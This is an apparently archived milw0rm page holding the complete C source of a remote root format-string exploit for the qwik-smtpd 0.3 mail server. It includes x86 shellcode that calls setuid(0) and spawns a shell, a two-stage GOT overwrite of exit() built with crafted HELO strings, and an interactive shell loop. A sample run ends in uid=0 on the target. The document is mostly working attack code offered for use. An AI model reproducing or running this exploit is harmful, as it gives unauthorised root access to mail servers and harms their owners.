<html><head><title>Qwik SMTP 0.3 Remote Root Format String Exploit</title></head><pre>/*
** qwik-smtp Remote Root Exploit
** -------------------------------
**
** Bug found by: Dark Eagle &lt;darkeagle [at] list d0t ru&gt;
** Exploit coded by: Carlos Barros &lt;barros [at] barrossecurity d0t com&gt;
** Home Page: http://www.barrossecurity.com
**
** Exploitation techinique:
**
** This bug is a simple format string bug. While coding this exploit, I found just two
** &quot;problems&quot;. The first is that our buffer is only 32 bytes long and the second is that
** qwik-smtpd filters spaces chars with the isspace(), this way our 0x0b code used in the
** shellcode is filtered. To circumvent the first problem I divided the exploit in two
** stages. The first one overwrite the LSW of the exit() GOT entry and the second overwrite
** the MSW. Then, we send an EXIT command forcing the qwik-smtpd to jump into our shellcode.
** The second problem was &quot;fixed&quot; using another char (0x10) and then decrementing it before
** calling the int 0x80 syscall.
**
** Notes:
**
** You MUST enter your external IP Address (when attacking remotely) or 127.0.0.1 (when
** attacking locally) cause its IP is printed before our buffer, so its length MUST enter
** in the calculation of the format string attack.
**
** sprintf(Received,&quot;Received: from %s (HELO %s) (%s) by %s with SMTP; %s\n&quot;,
** clientHost, clientHelo, clientIP, localHost, timebuf);
** ----------
** Destination MUST be one valid email address on the target machine. If not, it will reply
** with one erro code like this:
**
** -&gt; Sending RCPT TO ... ERROR - 550 user not here
**
** Screenshot:
**
** [barros@BarrosSecurity qwik]$ ./a.out -h localhost -u barros@teste.com -t 0 -i 127.0.0.1
**
** ==[ qwik_smtpd Remote Format String Exploit, bY Carlos Barros ]==
**
** *** Target plataform : qwik_smtpd 0.3 - Fedor Core 2
** *** Target host : localhost
** *** Target port : 25
** *** Target GOT : 0x0804b2e8
**
** *** Target Retaddr : 0xfeffe6f0
**
** -&gt; Connecting ... OK
** -&gt; Getting the banner ... 220 SMTP service ready
**
** *** STAGE 1 ***
**
** -&gt; Creating EvilBuffer ... OK
** -&gt; Sending HELO with EvilBuffer ... OK
** -&gt; Sending MAIL FROM with Shellcode ... OK
** -&gt; Sending RCPT TO ... OK
** -&gt; Sending DATA ... OK
** -&gt; Sending &quot;.&quot; ... OK
**
** *** STAGE 2 ***
**
** -&gt; Creating EvilBuffer ... OK
** -&gt; Sending HELO with EvilBuffer ... OK
** -&gt; Sending MAIL FROM with Shellcode ... OK
** -&gt; Sending RCPT TO ... OK
** -&gt; Sending DATA ... OK
** -&gt; Sending &quot;.&quot; ... OK
** -&gt; Attacking ... OK
**
** Try to send some commands. If doesn't work, hit CTRL+C to exit
**
** Linux BarrosSecurity 2.6.8-1.521 #1 Mon Aug 16 09:01:18 EDT 2004 i686 i686 i386 GNU/Linux
** uid=0(root) gid=0(root)
** exit
** [barros@BarrosSecurity qwik]$
*/

#include &lt;getopt.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;

/*--&lt; Prototypes &gt;--*/
void Usage(char *);
void fatal(char *);
int ConectToHost(char *,int);
char *CreateEvilBuffer(int,int);
void doHack(int);
void VerifyLastCommand(int, char *, char *);
void SendBufferAndVerify(int , char *, char *, char *);

/*--&lt; Defines &gt;--*/
#define DEFAULT_PORT 25
#define STDIN 0
#define STDOUT 1
#define MAX_BUFFER 1024
#define NOPSIZE 200
#define NOP 0x90
#define BUFFER_OFFSET &quot;567&quot; // Keep these \&quot;
#define PADDING &quot;.&quot; //

struct
{
char *Name;
int Gotaddr;
int Retaddr;
}Targets[] =
{
&quot;qwik_smtpd 0.3 - Fedor Core 2&quot;,
0x0804b2e8,
0xfeffe6f0,

// Finish
0,
0,
0
};

// Shellcode by The Itch of Netric (www.netric.org)
char Shellcode[] =
&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot; /* setuid(0); */
&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68&quot; /* execve() of /bins/h */
&quot;\x68\x2f\x2f\x62\x69\x89\xe3\x50&quot;
&quot;\x53\x89\xe1\xb0&quot;

&quot;\x10\x48\x48\x48\x48\x48&quot; // Modified by Carlos Barros to skip isspace()

&quot;\xcd\x80&quot;;

unsigned char STAGE=1;
int IP_Len = 0;

int main(int argc, char **argv)
{
extern char *optarg;
extern int optind;
char opt;
char *Host = NULL;
int Port = DEFAULT_PORT;
int TargetNumber = 0;
int Sock,i;
char *EvilBuffer;
char Buffer[MAX_BUFFER];
char *Rcpt_TO;
char Mail_From[NOPSIZE+strlen(Shellcode)+20];

int ttt;

fprintf(stdout,&quot;\n==[ qwik_smtpd Remote Format String Exploit, bY Carlos Barros ]==\n\n&quot;);

// Process arguments
while ( (opt = getopt(argc,argv,&quot;i:h:t:p:u:&quot;)) != EOF)
{
switch(opt)
{
case 'i':
IP_Len = strlen(optarg);
break;
case 'u':
Rcpt_TO = optarg;
break;
case 'p':
Port = atoi(optarg);
if(!Port) Usage(argv[0]);
break;
case 't':
TargetNumber = atoi(optarg);
break;
case 'h':
Host = optarg;
break;
default: Usage(argv[0]);
break;
}
}
if(Host == NULL || Rcpt_TO == NULL || !IP_Len) Usage(argv[0]);

// Verify target
for(i=0;;i++)
if(Targets[i].Name == 0) break;
if(--i&lt;TargetNumber) Usage(argv[0]);

fprintf(stdout,&quot;*** Target plataform : %s\n&quot;,Targets[TargetNumber].Name);
fprintf(stdout,&quot;*** Target host : %s\n&quot;,Host);
fprintf(stdout,&quot;*** Target port : %u\n&quot;,Port);
fprintf(stdout,&quot;*** Target GOT : %#010x\n\n&quot;,Targets[TargetNumber].Gotaddr);
fprintf(stdout,&quot;*** Target Retaddr : %#010x\n\n&quot;,Targets[TargetNumber].Retaddr);

fprintf(stdout,&quot;-&gt; Connecting ... &quot;);
fflush(stdout);
Sock = ConectToHost(Host,Port);
if(Sock == -1) fatal(&quot;Could not connect&quot;);
else fprintf(stdout,&quot;OK\n&quot;);

fprintf(stdout,&quot;-&gt; Getting the banner ... &quot;);
fflush(stdout);
if(recv(Sock,Buffer,MAX_BUFFER-1,0) != -1)
fprintf(stdout,&quot;%s&quot;,Buffer);
else
fatal(&quot;RECV&quot;);

for(;STAGE&lt;3;STAGE++)
{
fprintf(stdout,&quot;\n*** STAGE %d ***\n\n&quot;,STAGE);
fprintf(stdout,&quot;-&gt; Creating EvilBuffer ... &quot;);
fflush(stdout);
EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr);
fprintf(stdout,&quot;OK\n&quot;);

fprintf(stdout,&quot;-&gt; Sending HELO with EvilBuffer ... &quot;);
fflush(stdout);
SendBufferAndVerify(Sock,EvilBuffer,&quot;250&quot;,0);
free(EvilBuffer);

fprintf(stdout,&quot;-&gt; Sending MAIL FROM with Shellcode ... &quot;);
fflush(stdout);

// Create the string MAIL FROM NOP+SHELLCODE
strcpy(Mail_From,&quot;mail from &quot;);
memset(Mail_From+10,NOP,NOPSIZE);
Mail_From[10+NOPSIZE-1] = 0;
strcat(Mail_From,Shellcode);
strcat(Mail_From,&quot;\n&quot;);

SendBufferAndVerify(Sock,Mail_From,&quot;250&quot;,0);

fprintf(stdout,&quot;-&gt; Sending RCPT TO ... &quot;);
fflush(stdout);
snprintf(Buffer,MAX_BUFFER,&quot;rcpt to %s\n&quot;,Rcpt_TO);

SendBufferAndVerify(Sock,Buffer,&quot;250&quot;,&quot;251&quot;);

fprintf(stdout,&quot;-&gt; Sending DATA ... &quot;);
fflush(stdout);

sprintf(Buffer,&quot;data\n&quot;);
SendBufferAndVerify(Sock,Buffer,&quot;354&quot;,0);

fprintf(stdout,&quot;-&gt; Sending \&quot;.\&quot; ... &quot;);
fflush(stdout);
snprintf(Buffer,MAX_BUFFER,&quot;.\n&quot;);
SendBufferAndVerify(Sock,Buffer,&quot;250&quot;,0);
}

fprintf(stdout,&quot;-&gt; Attacking ... &quot;);
sprintf(Buffer,&quot;quit\n&quot;);
SendBufferAndVerify(Sock,Buffer,&quot;221&quot;,0);

fprintf(stdout,&quot;\nTry to send some commands. If doesn't work, hit CTRL+C to exit\n\n&quot;);
doHack(Sock);

close(Sock);
}

void SendBufferAndVerify(int Sock, char *Buffer, char *Code1, char *Code2)
{
if(send(Sock,Buffer,strlen(Buffer),0) == -1)
fatal(&quot;SEND&quot;);
VerifyLastCommand(Sock,Code1,Code2);
}

void VerifyLastCommand(int Sock, char *Code1, char *Code2)
{
char Buffer[MAX_BUFFER];

if(recv(Sock,Buffer,MAX_BUFFER-1,0) != -1)
{
if(strstr(Buffer,Code1) || (Code2 &amp;&amp; strstr(Buffer,Code2) )) fprintf(stdout,&quot;OK\n&quot;,Buffer);
else
{
*strstr(Buffer,&quot;\n&quot;) = 0;
fatal(Buffer);
}
}
else
fatal(&quot;RECV&quot;);
}

void Usage(char *Prog)
{
int i;
fprintf(stderr, &quot;Usage: %s -h hostname &lt;options&gt;\n\n&quot;
&quot;Options:\n\n&quot;
&quot; -i ipaddress : Your IP address\n&quot;
&quot; -u rcpt_to : Select one valid destination\n&quot;
&quot; -t target : Select the target\n&quot;
&quot; -p portnumber : Sets a new port number &lt;default: 25&gt;\n\n&quot;
&quot;Targets:\n\n&quot;,Prog);

for(i=0;;i++)
{
if(Targets[i].Name != 0)
fprintf(stderr,&quot; [%u] %s\n&quot;,i,Targets[i].Name);
else
break;
}
fprintf(stderr,&quot;\n&quot;);
exit(1);
}

void fatal(char *ErrorMsg)
{
fprintf(stderr,&quot;ERROR - %s\n\n&quot;,ErrorMsg);
exit(1);
}

int ConectToHost(char *Host,int Port)
{
struct sockaddr_in server;
struct hostent *hp;
int s;

server.sin_family = AF_INET;
hp = gethostbyname(Host);
if(!hp) return(-1);

memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
server.sin_port = htons(Port);

s = socket(PF_INET,SOCK_STREAM,0);
if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
return(-1);

return(s);
}

char *CreateEvilBuffer(int GOT, int Retaddr)
{
char *Buffer = malloc(500);

if(STAGE==1)
sprintf(Buffer,
&quot;helo &quot;PADDING
&quot;%c%c%c%c&quot; // GOT ADDR
&quot;%%%ud&quot; // LSW(EGGAddr)
&quot;%%&quot;BUFFER_OFFSET&quot;$hn&quot; // Write
&quot;\n&quot;,
((u_long)GOT),
((u_long)GOT &gt;&gt; 8),
((u_long)GOT &gt;&gt; 16),
((u_long)GOT &gt;&gt; 24),

((Retaddr &amp; 0x0000FFFF) - (27+IP_Len))
);
else
sprintf(Buffer,
&quot;helo &quot;PADDING
&quot;%c%c%c%c&quot; // GOT ADDR
&quot;%%%ud&quot; // LSW(EGGAddr)
&quot;%%&quot;BUFFER_OFFSET&quot;$hn&quot; // Write
&quot;\n&quot;,
((u_long)GOT+2),
(((u_long)GOT+2) &gt;&gt; 8),
(((u_long)GOT+2) &gt;&gt; 16),
(((u_long)GOT+2) &gt;&gt; 24),

(((Retaddr &amp; 0xFFFF0000)&gt;&gt;16) - (27+IP_Len))
);

return Buffer;
}

void doHack(int Sock)
{
char buffer[1024 * 10];
int count;
fd_set readfs;

write(Sock,&quot;uname -a;id\n&quot;,12);
while(1)
{
FD_ZERO(&amp;readfs);
FD_SET(STDIN, &amp;readfs);
FD_SET(Sock, &amp;readfs);
if(select(Sock + 1, &amp;readfs, NULL, NULL, NULL) &gt; 0)
{
if(FD_ISSET(STDIN, &amp;readfs))
{
if((count = read(STDIN, buffer, 1024)) &lt;= 0)
{
if(errno == EWOULDBLOCK || errno == EAGAIN)
continue;
else
{
close(Sock);
exit(-1);
}
}
write(Sock, buffer, count);
}
if(FD_ISSET(Sock, &amp;readfs))
{
if((count = read(Sock, buffer, 1024)) &lt;= 0)
{
if(errno == EWOULDBLOCK || errno == EAGAIN)
continue;
else
{
close(Sock);
exit(-1);
}
}
write(STDOUT, buffer, count);
}
}
}
}


// milw0rm.com [2004-11-09]</pre></html>